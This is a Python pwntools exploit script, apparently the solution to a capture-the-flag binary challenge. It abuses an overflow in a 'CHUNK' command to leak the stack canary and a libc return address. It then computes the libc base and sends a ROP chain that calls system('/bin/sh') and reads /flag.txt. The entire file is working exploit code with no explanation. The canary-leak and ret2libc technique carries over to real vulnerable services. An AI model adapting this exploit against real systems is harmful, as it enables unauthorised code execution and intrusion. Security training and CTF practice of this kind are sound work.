from pwn import *

exe = "./chall"
elf = ELF(exe)
libc = ELF("./libc.so.6")
context.arch="amd64"
context.os="linux"

with remote('localhost', 5000) as r:
    r.close()
    r = process(exe)
    r.recv(timeout=1)
    r.sendline("CHUNKS 4")
    r.readline()
    r.send(b"CHUNK 999 1 "+b"A"*73)
    leak1 = r.readline().strip()
    print(f"got canary line {leak1}")
    leak1 = leak1[-7-6:-6].ljust(8, b'\x00')
    canary = u64(leak1)
    print(f"---->canary is {hex(canary)}")
    # now leak libc ret
    r.send(b"CHUNK 999 1 "+b"A"*88)
    leak2 = r.readline().strip()
    print(f"got retaddr line {leak2}")
    leak2 = leak2[-6:].ljust(8, b'\x00')
    ret = u64(leak2)
    print(f"---->ret is {hex(ret)}")
    libc.address = ret-0x9caa4
    print(f"libc base calculated at {hex(libc.address)}")
    rop = ROP([libc])
    strflag = next(libc.search(b'/bin/sh\x00'))
    retgadget = rop.find_gadget(['ret'])[0]
    rop.raw(retgadget)
    rop.system(strflag)
    print(f"chain is: {rop.dump()} with bytes {rop.chain().hex()}")
    r.send(b"CHUNK 1 1 " + b"A"*72 + b'\x00'+ p64(canary) + p64(0)[:-1]+ rop.chain())
    r.readline()
    #needs a couple of runs due to sharing of the fd with the fork
    for i in range(10):
        r.send("cat /flag.txt\n")
        print(f"{r.readline()}")
        sleep(1)
    r.interactive()
